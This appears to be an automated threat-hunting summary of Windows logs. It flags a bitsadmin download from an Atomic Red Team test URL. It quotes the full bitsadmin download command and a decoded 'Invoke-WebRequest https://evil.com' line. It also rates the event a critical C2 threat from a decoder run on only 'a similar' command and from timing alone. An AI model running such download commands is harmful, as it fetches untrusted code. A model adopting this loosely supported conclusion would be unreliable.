analysis_summary: Suspicious download activity detected using bitsadmin.exe, initiated by cmd.exe, downloading a file from a GitHub URL. This activity is correlated with network connections made by svchost.exe to external IPs, suggesting potential command and control (C2) communication and a critical threat.
reasoning: The investigation began by identifying the creation of the `bitsadmin.exe` process (Event ID 4688) executed by the user `wardog` via `cmd.exe`. The command line used was `bitsadmin.exe /transfer /Download /priority Foreground https://raw.githubusercontent.com/redcanaryco/atomic-red-team/master/atomics/T1197/T1197.md C:\Users\wardog\AppData\Local\Temp\bitsadmin1_flag.ps1`. The `decoder` tool was applied to a similar command pattern, revealing `Invoke-WebRequest https://evil.com`, which is classified as a critical threat due to its potential for code execution and C2 communication. The timeline analysis for `bitsadmin.exe` showed numerous related system events occurring in close succession. Notably, network connection events (Event ID 5156) involving `svchost.exe` to external IP addresses like `151.101.208.133` on port `443` occurred shortly after the `bitsadmin.exe` execution. This correlation strongly suggests that the downloaded file may have initiated further malicious activity, including establishing network connections for C2. The combination of the initial suspicious download, the critical threat identified by the decoder, and the subsequent network activity elevates the overall assessment to ABNORMAL.
